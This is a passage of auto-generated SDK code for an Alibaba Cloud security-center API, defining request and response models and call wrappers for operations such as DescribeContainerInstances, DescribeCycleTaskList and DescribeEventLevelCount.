      namespace?: string(name='Namespace', example='kube-system'),
      nodeInfo?: string(name='NodeInfo', example='test'),
      nodeName?: string(name='NodeName', example='test'),
      pod?: string(name='Pod', example='alibaba-log-controller-6f847f8786-mk2mg'),
      podIp?: string(name='PodIp', example='172.24.XX.XX'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      riskCount?: string(name='RiskCount', example='1'),
      riskStatus?: string(name='RiskStatus', example='YES'),
      updateMark?: string(name='UpdateMark', example='79cff74d-e967-5407-8a78-ee03b9****'),
      vulCount?: int32(name='VulCount', example='15'),
      vulStatus?: string(name='VulStatus', example='YES'),
    }
  ](name='ContainerInstanceList'),
  pageInfo?: {
    count?: int32(name='Count', example='3'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='45'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
}

model DescribeContainerInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerInstancesResponseBody(name='body'),
}

async function describeContainerInstancesWithOptions(request: DescribeContainerInstancesRequest, runtime: Util.RuntimeOptions): DescribeContainerInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeContainerInstances(request: DescribeContainerInstancesRequest): DescribeContainerInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerInstancesWithOptions(request, runtime);
}

model DescribeContainerStatisticsRequest {
  clusterId?: string(name='ClusterId'),
}

model DescribeContainerStatisticsResponseBody = {
  data?: {
    remindAlarmCount?: int32(name='RemindAlarmCount'),
    seriousAlarmCount?: int32(name='SeriousAlarmCount'),
    suspiciousAlarmCount?: int32(name='SuspiciousAlarmCount'),
    totalAlarmCount?: int32(name='TotalAlarmCount'),
    totalNode?: int32(name='TotalNode'),
    hasRiskNode?: int32(name='hasRiskNode'),
  }(name='Data'),
  requestId?: string(name='RequestId'),
}

model DescribeContainerStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerStatisticsResponseBody(name='body'),
}

async function describeContainerStatisticsWithOptions(request: DescribeContainerStatisticsRequest, runtime: Util.RuntimeOptions): DescribeContainerStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeContainerStatistics(request: DescribeContainerStatisticsRequest): DescribeContainerStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerStatisticsWithOptions(request, runtime);
}

model DescribeContainerTagsRequest {
  appName?: string(name='AppName', example='node-exporter'),
  clusterId?: string(name='ClusterId', example='c22143730ab6e40b09ec7c1c51d4d****'),
  currentPage?: int32(name='CurrentPage', example='1'),
  fieldName?: string(name='FieldName', example='namespace'),
  fieldValue?: string(name='FieldValue', example='demo4'),
  namespace?: string(name='Namespace', example='test-name-01'),
  pageSize?: int32(name='PageSize', example='200'),
}

model DescribeContainerTagsResponseBody = {
  requestId?: string(name='RequestId', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  tagValues?: [ string ](name='TagValues'),
}

model DescribeContainerTagsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerTagsResponseBody(name='body'),
}

async function describeContainerTagsWithOptions(request: DescribeContainerTagsRequest, runtime: Util.RuntimeOptions): DescribeContainerTagsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerTags',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeContainerTags(request: DescribeContainerTagsRequest): DescribeContainerTagsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerTagsWithOptions(request, runtime);
}

model DescribeCountNotScannedImageResponseBody = {
  notScannedCnt?: int32(name='NotScannedCnt'),
  requestId?: string(name='RequestId'),
}

model DescribeCountNotScannedImageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCountNotScannedImageResponseBody(name='body'),
}

async function describeCountNotScannedImageWithOptions(runtime: Util.RuntimeOptions): DescribeCountNotScannedImageResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCountNotScannedImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCountNotScannedImage(): DescribeCountNotScannedImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCountNotScannedImageWithOptions(runtime);
}

model DescribeCountScannedImageResponseBody = {
  requestId?: string(name='RequestId'),
  scannedCount?: int32(name='ScannedCount'),
}

model DescribeCountScannedImageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCountScannedImageResponseBody(name='body'),
}

async function describeCountScannedImageWithOptions(runtime: Util.RuntimeOptions): DescribeCountScannedImageResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCountScannedImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCountScannedImage(): DescribeCountScannedImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCountScannedImageWithOptions(runtime);
}

model DescribeCriteriaRequest {
  machineTypes?: string(name='MachineTypes'),
  supportAutoTag?: boolean(name='SupportAutoTag'),
  value?: string(name='Value'),
}

model DescribeCriteriaResponseBody = {
  criteriaList?: [ 
    {
      multiValues?: string(name='MultiValues'),
      name?: string(name='Name'),
      type?: string(name='Type'),
      values?: string(name='Values'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId'),
}

model DescribeCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCriteriaResponseBody(name='body'),
}

async function describeCriteriaWithOptions(request: DescribeCriteriaRequest, runtime: Util.RuntimeOptions): DescribeCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.supportAutoTag)) {
    query['SupportAutoTag'] = request.supportAutoTag;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCriteria(request: DescribeCriteriaRequest): DescribeCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCriteriaWithOptions(request, runtime);
}

model DescribeCustomBlockRecordsRequest {
  blockIp?: string(name='BlockIp'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  status?: int32(name='Status'),
}

model DescribeCustomBlockRecordsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  recordList?: [ 
    {
      blockExpireDate?: long(name='BlockExpireDate'),
      blockIp?: string(name='BlockIp'),
      bound?: string(name='Bound'),
      enableCount?: int32(name='EnableCount'),
      id?: long(name='Id'),
      serverCount?: int32(name='ServerCount'),
      source?: string(name='Source'),
      status?: int32(name='Status'),
      targetList?: [ 
        {
          target?: string(name='Target'),
          targetType?: string(name='TargetType'),
        }
      ](name='TargetList'),
    }
  ](name='RecordList'),
  requestId?: string(name='RequestId'),
}

model DescribeCustomBlockRecordsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCustomBlockRecordsResponseBody(name='body'),
}

async function describeCustomBlockRecordsWithOptions(request: DescribeCustomBlockRecordsRequest, runtime: Util.RuntimeOptions): DescribeCustomBlockRecordsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCustomBlockRecords',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCustomBlockRecords(request: DescribeCustomBlockRecordsRequest): DescribeCustomBlockRecordsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCustomBlockRecordsWithOptions(request, runtime);
}

model DescribeCycleTaskListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  taskName?: string(name='TaskName', description='The name of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: virus scan task
*   **IMAGE_SCAN**: image scan task
*   **EMG_VUL_SCHEDULE_SCAN**: urgent vulnerability scan task', example='IMAGE_SCAN'),
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: virus scan task
*   **IMAGE_SCAN**: image scan task
*   **EMG_VUL_SCHEDULE_SCAN**: urgent vulnerability scan task', example='IMAGE_SCAN'),
}

model DescribeCycleTaskListResponseBody = {
  cycleScheduleResponseList?: [ 
    {
      configId?: string(name='ConfigId', description='The ID of the task configuration.', example='2cdbdeba8dd70586d5814d4cbf21****'),
      enable?: int32(name='Enable', description='Indicates whether the task is enabled. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
      firstDateStr?: long(name='FirstDateStr', description='The time when the task first run.', example='1667491200000'),
      intervalPeriod?: int32(name='IntervalPeriod', description='The interval of the task.', example='3'),
      lastTaskId?: string(name='LastTaskId', description='The ID of the task when the task last run.', example='38730bb078f4a1461d4ed283994c****'),
      nextStartTimeStr?: long(name='NextStartTimeStr', description='The next time when the task starts. The value is a UNIX timestamp. Unit: milliseconds.', example='1671184531000'),
      param?: string(name='Param', description='The additional information.', example='{"userAgreement":"yes","lang":"zh"}'),
      periodUnit?: string(name='PeriodUnit', description='The unit of the scan interval. Valid values:

*   **day**: days
*   **hour**: hours', example='day'),
      targetEndTime?: int32(name='TargetEndTime', description='The period of time before the task ends. Unit: hours.', example='7'),
      targetStartTime?: int32(name='TargetStartTime', description='The period of time before the next task starts. Unit: hours.', example='0'),
      taskName?: string(name='TaskName', description='The name of the task.', example='IMAGE_SCAN'),
      taskType?: string(name='TaskType', description='The type of the task.', example='IMAGE_SCAN'),
    }
  ](name='CycleScheduleResponseList', description='An array that consists of periodic scan tasks.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
}

model DescribeCycleTaskListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCycleTaskListResponseBody(name='body'),
}

async function describeCycleTaskListWithOptions(request: DescribeCycleTaskListRequest, runtime: Util.RuntimeOptions): DescribeCycleTaskListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCycleTaskList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCycleTaskList(request: DescribeCycleTaskListRequest): DescribeCycleTaskListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCycleTaskListWithOptions(request, runtime);
}

model DescribeDingTalkRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  ruleActionName?: string(name='RuleActionName'),
}

model DescribeDingTalkResponseBody = {
  actionList?: [ 
    {
      actionName?: string(name='ActionName'),
      aliUid?: long(name='AliUid'),
      configList?: string(name='ConfigList'),
      dingTalkLang?: string(name='DingTalkLang'),
      gmtCreate?: long(name='GmtCreate'),
      gmtModified?: long(name='GmtModified'),
      groupIdList?: string(name='GroupIdList'),
      id?: int32(name='Id'),
      intervalTime?: int32(name='IntervalTime'),
      status?: int32(name='Status'),
      url?: string(name='Url'),
    }
  ](name='ActionList'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeDingTalkResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDingTalkResponseBody(name='body'),
}

async function describeDingTalkWithOptions(request: DescribeDingTalkRequest, runtime: Util.RuntimeOptions): DescribeDingTalkResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.ruleActionName)) {
    query['RuleActionName'] = request.ruleActionName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDingTalk',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeDingTalk(request: DescribeDingTalkRequest): DescribeDingTalkResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDingTalkWithOptions(request, runtime);
}

model DescribeDomainCountRequest {
  sourceIp?: string(name='SourceIp'),
}

model DescribeDomainCountResponseBody = {
  requestId?: string(name='RequestId'),
  rootDomainsCount?: int32(name='RootDomainsCount'),
  subDomainsCount?: int32(name='SubDomainsCount'),
  totalDomainsCount?: int32(name='TotalDomainsCount'),
}

model DescribeDomainCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDomainCountResponseBody(name='body'),
}

async function describeDomainCountWithOptions(request: DescribeDomainCountRequest, runtime: Util.RuntimeOptions): DescribeDomainCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeDomainCount(request: DescribeDomainCountRequest): DescribeDomainCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainCountWithOptions(request, runtime);
}

model DescribeDomainDetailRequest {
  domainName?: string(name='DomainName'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeDomainDetailResponseBody = {
  alarmCount?: int32(name='AlarmCount'),
  domain?: string(name='Domain'),
  domainDetailItems?: [ 
    {
      assetType?: string(name='AssetType'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      uuid?: string(name='Uuid'),
    }
  ](name='DomainDetailItems'),
  requestId?: string(name='RequestId'),
  rootDomain?: string(name='RootDomain'),
  vulCount?: int32(name='VulCount'),
}

model DescribeDomainDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDomainDetailResponseBody(name='body'),
}

async function describeDomainDetailWithOptions(request: DescribeDomainDetailRequest, runtime: Util.RuntimeOptions): DescribeDomainDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.domainName)) {
    query['DomainName'] = request.domainName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeDomainDetail(request: DescribeDomainDetailRequest): DescribeDomainDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainDetailWithOptions(request, runtime);
}

model DescribeDomainListRequest {
  currentPage?: int32(name='CurrentPage'),
  domainType?: string(name='DomainType'),
  fuzzyDomain?: string(name='FuzzyDomain'),
  pageSize?: int32(name='PageSize'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeDomainListResponseBody = {
  domainListResponseList?: [ 
    {
      domain?: string(name='Domain'),
      ipList?: string(name='IpList'),
    }
  ](name='DomainListResponseList'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeDomainListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDomainListResponseBody(name='body'),
}

async function describeDomainListWithOptions(request: DescribeDomainListRequest, runtime: Util.RuntimeOptions): DescribeDomainListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.domainType)) {
    query['DomainType'] = request.domainType;
  }
  if (!Util.isUnset(request.fuzzyDomain)) {
    query['FuzzyDomain'] = request.fuzzyDomain;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeDomainList(request: DescribeDomainListRequest): DescribeDomainListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainListWithOptions(request, runtime);
}

model DescribeEmgUserAgreementResponseBody = {
  auth?: boolean(name='Auth'),
  requestId?: string(name='RequestId'),
}

model DescribeEmgUserAgreementResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEmgUserAgreementResponseBody(name='body'),
}

async function describeEmgUserAgreementWithOptions(runtime: Util.RuntimeOptions): DescribeEmgUserAgreementResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeEmgUserAgreement',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeEmgUserAgreement(): DescribeEmgUserAgreementResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEmgUserAgreementWithOptions(runtime);
}

model DescribeEmgVulItemRequest {
  checkType?: int32(name='CheckType', example='0'),
  currentPage?: int32(name='CurrentPage'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  riskStatus?: string(name='RiskStatus'),
  scanType?: string(name='ScanType'),
  vulName?: string(name='VulName'),
}

model DescribeEmgVulItemResponseBody = {
  currentPage?: int32(name='CurrentPage'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName'),
      checkType?: int32(name='CheckType'),
      gmtLastCheck?: long(name='GmtLastCheck'),
      gmtPublish?: long(name='GmtPublish'),
      name?: string(name='Name'),
      pendingCount?: int32(name='PendingCount'),
      progress?: int32(name='Progress'),
      status?: int32(name='Status'),
      type?: string(name='Type'),
    }
  ](name='GroupedVulItems'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeEmgVulItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEmgVulItemResponseBody(name='body'),
}

async function describeEmgVulItemWithOptions(request: DescribeEmgVulItemRequest, runtime: Util.RuntimeOptions): DescribeEmgVulItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkType)) {
    query['CheckType'] = request.checkType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskStatus)) {
    query['RiskStatus'] = request.riskStatus;
  }
  if (!Util.isUnset(request.scanType)) {
    query['ScanType'] = request.scanType;
  }
  if (!Util.isUnset(request.vulName)) {
    query['VulName'] = request.vulName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeEmgVulItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeEmgVulItem(request: DescribeEmgVulItemRequest): DescribeEmgVulItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEmgVulItemWithOptions(request, runtime);
}

model DescribeEventLevelCountRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c7e3c5b420a7947c2933303144688****'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query alert events on containers. Valid values:

*   **instanceId**: the ID of the asset
*   **appName**: the name of the application
*   **clusterId**: the ID of the cluster
*   **regionId**: the ID of the region
*   **nodeName**: the name of the node
*   **namespace**: the namespace
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image
*   **imageDigest**: the digest of the image', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query alert events on containers. If you specify multiple values, separate them with commas (,).', example='c951761046a9c4afe92be0a7b5bexxxxx'),
  containerIds?: string(name='ContainerIds', description='The ID of the container.', example='xxxxxx30389a10c28f6d38f2398f0dcexxxxxxx922b9e8290dc7c3019d4a8,48b87f2c0662e334820f436cb9133f1ae4e053d39b6fad42xxxxxxxxxx'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
  targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the ID of the asset', example='uuid'),
}

model DescribeEventLevelCountResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  eventLevels?: {
    remind?: int32(name='Remind', description='The number of alerts whose Emergency level is Reminder.', example='2'),
    serious?: int32(name='Serious', description='The number of alerts whose Emergency level is Urgent.', example='0'),
    suspicious?: int32(name='Suspicious', description='The number of alerts whose Emergency level is Suspicious.', example='1'),
  }(name='EventLevels', description='The statistics of alerts events by risk level.'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='CE8CA5EA-24EF-5D41-B735-53ACE7XXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DescribeEventLevelCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEventLevelCountResponseBody(name='body'),
}

async function describeEventLevelCountWithOptions(request: DescribeEventLevelCountRequest, runtime: Util.RuntimeOptions): DescribeEventLevelCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.containerIds)) {
    query['ContainerIds'] = request.containerIds;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeEventLevelCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeEventLevelCount(request: DescribeEventLevelCountRequest): DescribeEventLevelCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEventLevelCountWithOptions(request, runtime);
}

model DescribeEventOnStageRequest {
  lang?: string(name='Lang', example='zh'),
}

model DescribeEventOnStageResponseBody = {
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E332241XXXXX'),
  securityEventStageResponse?: {
    securityEventOnStag?: map[string]any(name='SecurityEventOnStag'),
  }(name='SecurityEventStageResponse'),
}

model DescribeEventOnStageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEventOnStageResponseBody(name='body'),
}

async function describeEventOnStageWithOptions(request: DescribeEventOnStageRequest, runtime: Util.RuntimeOptions): DescribeEventOnStageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeEventOnStage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
